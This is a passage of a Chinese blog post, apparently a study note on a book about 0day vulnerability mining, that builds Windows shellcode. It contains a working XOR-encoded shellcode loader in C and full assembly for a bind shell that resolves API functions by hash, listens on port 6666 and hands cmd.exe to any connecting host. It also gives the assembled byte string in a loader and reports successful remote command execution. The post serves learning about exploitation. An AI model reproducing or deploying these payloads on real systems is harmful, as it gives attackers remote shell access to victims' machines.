+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 03_xor_shellcode.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> encode_shellcode[] = </span><br><span class="line"><span class="string">"\xb8\x2c\x2e\x4e\x7c\x5a\x2c\x27\xcd\x95\x0b\x2c\x76\x30\xd5\x48"</span></span><br><span class="line"><span class="string">"\xcd\xa2\xc9\x3a\xb0\x75\x9f\xf3\x40\x6d\x98\x22\xff\x77\x76\x17"</span></span><br><span class="line"><span class="string">"\x2c\x31\x37\x21\x36\x10\x75\x96\x20\xcf\x1e\x74\xcf\x0f\x48\xcf"</span></span><br><span class="line"><span class="string">"\x0d\x58\xcf\x4d\xcf\x2d\x4c\xe9\x79\x2e\x4e\x7c\x5a\x31\x41\xd1"</span></span><br><span class="line"><span class="string">"\xbb\x13\xbc\xd1\x24\xcf\x01\x78\xcf\x08\x41\x3c\x45\xad\xcf\x1d"</span></span><br><span class="line"><span class="string">"\x64\x45\xaf\x75\xbb\x03\xcf\x70\xff\x45\xaa\xdd\x4b\xfa\x42\x7c"</span></span><br><span class="line"><span class="string">"\xa4\x30\x4c\x85\x8e\x43\x45\x86\x02\xaf\xb5\x7f\x10\x60\x58\x31"</span></span><br><span class="line"><span class="string">"\xa0\xcf\x1d\x60\x45\xaf\x22\xcf\x78\x3f\xcf\x1d\x58\x45\xaf\x47"</span></span><br><span class="line"><span class="string">"\x68\xff\xd1\x1b\xef\x13\x25\x79\x2e\x4e\x7c\x5a\x31\xed\x75\x9f"</span></span><br><span class="line"><span class="string">"\x17\x2c\x33\x21\x37\x30\x2c\x22\x25\x2d\x28\xcd\xa4\x17\x14\x14"</span></span><br><span class="line"><span class="string">"\x17\xbb\x13\xb8\x17\xbb\x13\xbc\xd4\xd4\xd4\xd4"</span>;</span><br><span class="line">	</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		lea eax, encode_shellcode</span><br><span class="line">		<span class="keyword">xor</span> ecx,ecx</span><br><span class="line">		decode_loop:</span><br><span class="line">		mov bl,[eax+ecx]</span><br><span class="line">		<span class="keyword">xor</span> bl,<span class="number">0x44</span></span><br><span class="line">		mov [eax+ecx],bl</span><br><span class="line">		inc ecx</span><br><span class="line">		cmp bl,<span class="number">0x90</span></span><br><span class="line">		jne decode_loop</span><br><span class="line">		push eax</span><br><span class="line">		ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="0day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98_3.5_%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E5%8F%8D%E5%BC%B9shell%E7%9A%84shellcode.assets/image-20210603221638086.png" alt="image-20210603221638086"></p>
+<h1 id="bind-shellcode的构造"><a href="#bind-shellcode的构造" class="headerlink" title="bind_shellcode的构造"></a>bind_shellcode的构造</h1><p>__emit指令：相当于db指令，被称为伪指令，细节参考下面链接：</p>
+<p><a href="http://www.cppblog.com/myjfm/archive/2011/11/05/159647.aspx" target="_blank" rel="noopener">http://www.cppblog.com/myjfm/archive/2011/11/05/159647.aspx</a></p>
+<p>原文中的代码为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br></pre></td><td class="code"><pre><span class="line">main()</span><br><span class="line">&#123;</span><br><span class="line">	__asm&#123;</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">		; start of shellcode </span><br><span class="line">		; assume: eax points here </span><br><span class="line">		; <span class="function">function <span class="title">hashes</span> <span class="params">(executable as nop-equivalent)</span> </span></span><br><span class="line"><span class="function">			_emit 0x59	</span>; LoadLibraryA ; pop ecx </span><br><span class="line">			_emit <span class="number">0x81</span> 	; CreateProcessA ; <span class="keyword">or</span> ecx, <span class="number">0x203062d3</span> </span><br><span class="line">			_emit <span class="number">0xc9</span> 	; ExitProcess </span><br><span class="line">			_emit <span class="number">0xd3</span> 	; WSAStartup </span><br><span class="line">			_emit <span class="number">0x62</span> 	; WSASocketA </span><br><span class="line">			_emit <span class="number">0x30</span> 	; bind </span><br><span class="line">			_emit <span class="number">0x20</span> 	; <span class="built_in">listen</span> </span><br><span class="line">			_emit <span class="number">0x41</span> 	; accept ; inc ecx </span><br><span class="line"></span><br><span class="line">		; <span class="string">"CMd"</span> </span><br><span class="line">			_emit <span class="number">0x43</span> 	; inc ebx </span><br><span class="line">			_emit <span class="number">0x4d</span> 	; dec ebp </span><br><span class="line">			_emit <span class="number">0x64</span> 	; FS: </span><br><span class="line">		</span><br><span class="line">		; start of proper code </span><br><span class="line">			cdq 					; <span class="built_in">set</span> edx = <span class="number">0</span> (eax points to <span class="built_in">stack</span> so is less than <span class="number">0x80000000</span>) </span><br><span class="line">			xchg eax, esi 			; esi = addr of first function hash </span><br><span class="line">			lea edi, [esi - <span class="number">0x18</span>] 	; edi = addr to start writing function </span><br><span class="line">									; addresses (last addr will be written just </span><br><span class="line">									; before <span class="string">"cmd"</span>) </span><br><span class="line">			</span><br><span class="line">		; <span class="built_in">find</span> base addr of kernel32.dll </span><br><span class="line">			mov ebx, fs:[edx + <span class="number">0x30</span>] 	; ebx = address of PEB </span><br><span class="line">			mov ecx, [ebx + <span class="number">0x0c</span>] 		; ecx = pointer to loader data </span><br><span class="line">			mov ecx, [ecx + <span class="number">0x1c</span>] 		; ecx = first entry in initialisation order <span class="built_in">list</span> </span><br><span class="line">			mov ecx, [ecx] 				; ecx = second entry in <span class="built_in">list</span> (kernel32.dll) </span><br><span class="line">			mov ebp, [ecx + <span class="number">0x08</span>] 		; ebp = base address of kernel32.dll </span><br><span class="line">			</span><br><span class="line">		; make some <span class="built_in">stack</span> space </span><br><span class="line">			mov dh, <span class="number">0x03</span> 			; <span class="keyword">sizeof</span>(WSADATA) is <span class="number">0x190</span> </span><br><span class="line">			sub esp, edx </span><br><span class="line">			</span><br><span class="line">		; push a pointer to <span class="string">"ws2_32"</span> onto <span class="built_in">stack</span> </span><br><span class="line">			mov dx, <span class="number">0x3233</span> 			; rest of edx is null </span><br><span class="line">			push edx </span><br><span class="line">			push <span class="number">0x5f327377</span> </span><br><span class="line">			push esp </span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">		find_lib_functions: </span><br><span class="line">			lodsb 					; load next hash into al <span class="keyword">and</span> increment esi </span><br><span class="line">			cmp al, <span class="number">0xd3</span> 				; hash of WSAStartup - trigger </span><br><span class="line">									; LoadLibrary(<span class="string">"ws2_32"</span>) </span><br><span class="line">			jne find_functions </span><br><span class="line">			xchg eax, ebp 			; save current hash </span><br><span class="line">			call [edi - <span class="number">0xc</span>] 			; LoadLibraryA </span><br><span class="line">			xchg eax, ebp 			; restore current hash, <span class="keyword">and</span> update ebp </span><br><span class="line">									; with base address of ws2_32.dll </span><br><span class="line">			push edi 					; save location of addr of first winsock function </span><br><span class="line">			</span><br><span class="line">		find_functions: </span><br><span class="line">			pushad 						; preserve registers </span><br><span class="line">			mov eax, [ebp + <span class="number">0x3c</span>]		; eax = start of PE header </span><br><span class="line">			mov ecx, [ebp + eax + <span class="number">0x78</span>]	; ecx = relative offset of <span class="keyword">export</span> table </span><br><span class="line">			add ecx, ebp 				; ecx = absolute addr of <span class="keyword">export</span> table </span><br><span class="line">			mov ebx, [ecx + <span class="number">0x20</span>] 		; ebx = relative offset of names table </span><br><span class="line">			add ebx, ebp 				; ebx = absolute addr of names table </span><br><span class="line">			<span class="keyword">xor</span> edi, edi 				; edi will count through the functions </span><br><span class="line"></span><br><span class="line">			</span><br><span class="line">		next_function_loop: </span><br><span class="line">			inc edi 					; increment function counter </span><br><span class="line">			mov esi, [ebx + edi * <span class="number">4</span>] 	; esi = relative offset of current function name </span><br><span class="line">			add esi, ebp 				; esi = absolute addr of current function name </span><br><span class="line">			cdq 						; <span class="function">dl will hold <span class="title">hash</span> <span class="params">(we know eax is small)</span> </span></span><br><span class="line"><span class="function">			</span></span><br><span class="line"><span class="function">		hash_loop: </span></span><br><span class="line"><span class="function">			lodsb 					</span>; load next <span class="keyword">char</span> into al <span class="keyword">and</span> increment esi </span><br><span class="line">			<span class="keyword">xor</span> al, <span class="number">0x71</span> 				; XOR current <span class="keyword">char</span> with <span class="number">0x71</span> </span><br><span class="line">			sub dl, al 				; update hash with current <span class="keyword">char</span> </span><br><span class="line">			cmp al, <span class="number">0x71</span> 				; loop until we reach <span class="built_in">end</span> of <span class="built_in">string</span> </span><br><span class="line">			jne hash_loop </span><br><span class="line">			cmp dl, [esp + <span class="number">0x1c</span>] 		; <span class="function">compare to the requested <span class="title">hash</span> <span class="params">(saved on <span class="built_in">stack</span> from pushad)</span> </span></span><br><span class="line"><span class="function">			jnz next_function_loop </span></span><br><span class="line"><span class="function">			</span></span><br><span class="line"><span class="function">										</span>; we now have the right function </span><br><span class="line">			</span><br><span class="line">			mov ebx, [ecx + <span class="number">0x24</span>] 		; ebx = relative offset of ordinals table </span><br><span class="line">			add ebx, ebp 				; ebx = absolute addr of ordinals table </span><br><span class="line">			mov di, [ebx + <span class="number">2</span> * edi] 		; di = ordinal number of matched function </span><br><span class="line">			mov ebx, [ecx + <span class="number">0x1c</span>] 		; ebx = relative offset of address table </span><br><span class="line">			add ebx, ebp 				; ebx = absolute addr of address table </span><br><span class="line">			add ebp, [ebx + <span class="number">4</span> * edi] 	; <span class="function">add to <span class="title">ebp</span> <span class="params">(base addr of <span class="keyword">module</span>)</span> the </span></span><br><span class="line"><span class="function">										</span>; relative offset of matched function </span><br><span class="line">			xchg eax, ebp 				; <span class="built_in">move</span> func addr into eax </span><br><span class="line">			pop edi 					; edi is last onto <span class="built_in">stack</span> in pushad </span><br><span class="line">			stosd 					; <span class="built_in">write</span> function addr to [edi] <span class="keyword">and</span> increment edi </span><br><span class="line">			push edi </span><br><span class="line">			popad					; restore registers </span><br><span class="line">			cmp esi, edi 				; loop until we reach <span class="built_in">end</span> of last hash </span><br><span class="line">			jne find_lib_functions </span><br><span class="line">			pop esi 					; saved location of first winsock function </span><br><span class="line">										; we will lodsd <span class="keyword">and</span> call each func in sequence </span><br><span class="line">			</span><br><span class="line">		; initialize winsock </span><br><span class="line">			</span><br><span class="line">			push esp 					; use <span class="built_in">stack</span> <span class="keyword">for</span> WSADATA </span><br><span class="line">			push <span class="number">0x02</span> 				; wVersionRequested </span><br><span class="line">			lodsd </span><br><span class="line">			call eax 					; WSAStartup </span><br><span class="line">			</span><br><span class="line">		; null-<span class="built_in">terminate</span> <span class="string">"cmd"</span> </span><br><span class="line">			mov <span class="keyword">byte</span> ptr [esi + <span class="number">0x13</span>], al ; eax = <span class="number">0</span> <span class="keyword">if</span> WSAStartup() worked </span><br><span class="line">			</span><br><span class="line">		; <span class="built_in">clear</span> some <span class="built_in">stack</span> to use as <span class="literal">NULL</span> parameters </span><br><span class="line">			lea ecx, [eax + <span class="number">0x30</span>] 		; <span class="keyword">sizeof</span>(STARTUPINFO) = <span class="number">0x44</span>, </span><br><span class="line">			mov edi, esp </span><br><span class="line">			rep stosd 				; eax is still <span class="number">0</span> </span><br><span class="line">		</span><br><span class="line">		; create socket </span><br><span class="line">			inc eax </span><br><span class="line">			push eax					; type = <span class="number">1</span> (SOCK_STREAM) </span><br><span class="line">			inc eax </span><br><span class="line">			push eax ; af = <span class="number">2</span> (AF_INET) </span><br><span class="line">			lodsd </span><br><span class="line">			call eax ; WSASocketA </span><br><span class="line">			xchg ebp, eax				; <span class="function">save SOCKET descriptor in <span class="title">ebp</span> <span class="params">(safe from </span></span></span><br><span class="line"><span class="function"><span class="params">										; being changed by remaining API calls)</span> </span></span><br><span class="line"><span class="function">			</span></span><br><span class="line"><span class="function">		</span>; push bind parameters </span><br><span class="line">			mov eax, <span class="number">0x0a1aff02</span> 		; <span class="number">0x1a0a</span> = port <span class="number">6666</span>, <span class="number">0x02</span> = AF_INET </span><br><span class="line">			<span class="keyword">xor</span> ah, ah					; <span class="built_in">remove</span> the ff from eax </span><br><span class="line">			push eax	 				; we use <span class="number">0x0a1a0002</span> <span class="function">as both the <span class="title">name</span> <span class="params">(struct </span></span></span><br><span class="line"><span class="function"><span class="params">										; sockaddr)</span> <span class="keyword">and</span> <span class="title">namelen</span> <span class="params">(which only needs to </span></span></span><br><span class="line"><span class="function"><span class="params">										; be large enough)</span> </span></span><br><span class="line"><span class="function">			push esp 					</span>; pointer to our sockaddr <span class="class"><span class="keyword">struct</span> </span></span><br><span class="line"><span class="class">			</span></span><br><span class="line">		; call bind(), listen() and accept() in turn </span><br><span class="line">		call_loop: </span><br><span class="line">			push ebp					; <span class="function">saved SOCKET <span class="title">descriptor</span> <span class="params">(we implicitly pass </span></span></span><br><span class="line"><span class="function"><span class="params">										; <span class="literal">NULL</span> <span class="keyword">for</span> all other params)</span> </span></span><br><span class="line"><span class="function">			lodsd </span></span><br><span class="line"><span class="function">			call eax 					</span>; call the next function </span><br><span class="line">			test eax, eax 				; bind() and listen() return 0, accept() </span><br><span class="line">										; returns a SOCKET descriptor </span><br><span class="line">			jz call_loop </span><br><span class="line">			</span><br><span class="line">		; initialise a STARTUPINFO structure at esp </span><br><span class="line">			inc <span class="keyword">byte</span> ptr [esp + <span class="number">0x2d</span>] 	; <span class="built_in">set</span> STARTF_USESTDHANDLES to <span class="literal">true</span> </span><br><span class="line">			sub edi, <span class="number">0x6c</span> 				; <span class="built_in">point</span> edi at hStdInput in STARTUPINFO </span><br><span class="line">			stosd 					; use SOCKET descriptor returned by accept </span><br><span class="line">									; (still in eax) as the <span class="built_in">stdin</span> handle </span><br><span class="line">			stosd 					; same <span class="keyword">for</span> <span class="built_in">stdout</span> </span><br><span class="line">			stosd					; <span class="function">same <span class="keyword">for</span> <span class="title">stderr</span> <span class="params">(optional)</span> </span></span><br><span class="line"><span class="function">			</span></span><br><span class="line"><span class="function">		</span>; create <span class="built_in">process</span> </span><br><span class="line">			pop eax 			; <span class="built_in">set</span> eax = <span class="number">0</span> (STARTUPINFO now at esp + <span class="number">4</span>) </span><br><span class="line">			push esp			; use <span class="built_in">stack</span> as PROCESSINFORMATION structure </span><br><span class="line">			; (STARTUPINFO now back to esp) </span><br><span class="line">			push esp 			; STARTUPINFO structure </span><br><span class="line">			push eax 		; lpCurrentDirectory = <span class="literal">NULL</span> </span><br><span class="line">			push eax 		; lpEnvironment = <span class="literal">NULL</span> </span><br><span class="line">			push eax 		; dwCreationFlags = <span class="literal">NULL</span> </span><br><span class="line">			push esp 			; bInheritHandles = <span class="literal">true</span> </span><br><span class="line">			push eax 		; lpThreadAttributes = <span class="literal">NULL</span> </span><br><span class="line">			push eax 		; lpProcessAttributes = <span class="literal">NULL</span> </span><br><span class="line">			push esi 			; lpCommandLine = <span class="string">"cmd"</span> </span><br><span class="line">			push eax 		; lpApplicationName = <span class="literal">NULL</span> </span><br><span class="line">			call [esi - <span class="number">0x1c</span>] 	; CreateProcessA </span><br><span class="line">			</span><br><span class="line">		; <span class="function">call <span class="title">ExitProcess</span><span class="params">()</span> </span></span><br><span class="line">			call [esi - 0x18] ; ExitProcess</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">			nop</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="报错的解决"><a href="#报错的解决" class="headerlink" title="报错的解决"></a>报错的解决</h2><p>直接编译是可以编译成功的，但是直接执行会报错：</p>
+<p><img src="0day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98_3.5_%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E5%8F%8D%E5%BC%B9shell%E7%9A%84shellcode.assets/image-20210604215739917.png" alt="image-20210604215739917"></p>
+<p>这里需要把上面的汇编代码转换成shellcode才可以，因为有_emit伪指令，所以在上一节说到的在线转shellcode的网站会转失败，所以直接扔到OD里，然后拷贝出来</p>
+<p><img src="0day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98_3.5_%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E5%8F%8D%E5%BC%B9shell%E7%9A%84shellcode.assets/image-20210604221914422.png" alt="image-20210604221914422"></p>
+<p>最后加载shellcode的完整代码为：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"stdafx.h"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> sc[] = <span class="string">"\x59\x81\xC9\xD3\x62\x30\x20\x41\x43\x4D\x64\x99\x96\x8D\x7E\xE8\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B\x49\x1C\x8B\x09\x8B\x69\x08\xB6\x03\x2B\xE2\x66\xBA\x33\x32\x52\x68\x77\x73\x32\x5F\x54\xAC\x3C\xD3\x75\x06\x95\xFF\x57\xF4\x95\x57\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\xAC\x34\x71\x2A\xD0\x3C\x71\x75\xF7\x3A\x54\x24\x1C\x75\xEA\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03\x2C\xBB\x95\x5F\xAB\x57\x61\x3B\xF7\x75\xB4\x5E\x54\x6A\x02\xAD\xFF\xD0\x88\x46\x13\x8D\x48\x30\x8B\xFC\xF3\xAB\x40\x50\x40\x50\xAD\xFF\xD0\x95\xB8\x02\xFF\x1A\x0A\x32\xE4\x50\x54\x55\xAD\xFF\xD0\x85\xC0\x74\xF8\xFE\x44\x24\x2D\x83\xEF\x6C\xAB\xAB\xAB\x58\x54\x54\x50\x50\x50\x54\x50\x50\x56\x50\xFF\x56\xE4\xFF\x56\xE8\x90"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm&#123;</span><br><span class="line">			lea eax,sc</span><br><span class="line">			push eax</span><br><span class="line">			ret</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="0day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98_3.5_%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E5%8F%8D%E5%BC%B9shell%E7%9A%84shellcode.assets/image-20210604222200448.png" alt="image-20210604222200448"></p>
+<p>直接用另一台主机连接：</p>
+<p><img src="0day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98_3.5_%E6%9E%84%E9%80%A0%E4%B8%80%E4%B8%AA%E5%8F%8D%E5%BC%B9shell%E7%9A%84shellcode.assets/image-20210604222236552.png" alt="image-20210604222236552"></p>
+<p>命令执行成功。</p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2021/05-19-0Day%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98_3.4_%E6%9E%84%E9%80%A0%E5%8A%A8%E6%80%81%E5%AE%9A%E4%BD%8D%E7%B3%BB%E7%BB%9FAPI%E7%9A%84shellcode/">0Day漏洞挖掘_3.4_构造动态定位系统API的shellcode</a>
+            
+        </section>
+	
+		<section id="comments" class="comments">
+		  <style>
+			.comments{margin:30px;padding:10px;background:#fff}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#fff}}
+		  </style>
+		  <div class="valine_comment"></div>
+<!--载入js，在</body>之前插入即可-->
+<!--Leancloud 操作库:-->
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<!--Valine 的核心代码库-->
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<script>
+  new Valine({
+      el: '.valine_comment',
+      app_id: 'ehQ0k7G3fcpwmkyxhG8U6DzL-gzGzoHsz',
+      app_key: 'AwwXGgbdqswiimAY0qJYhtRa',
+      placeholder: '这里留言。。',
+      notify: 'true',
+      verify: 'true',
+    });
+</script>
+		</section>
+	
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© SeikoSrp | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
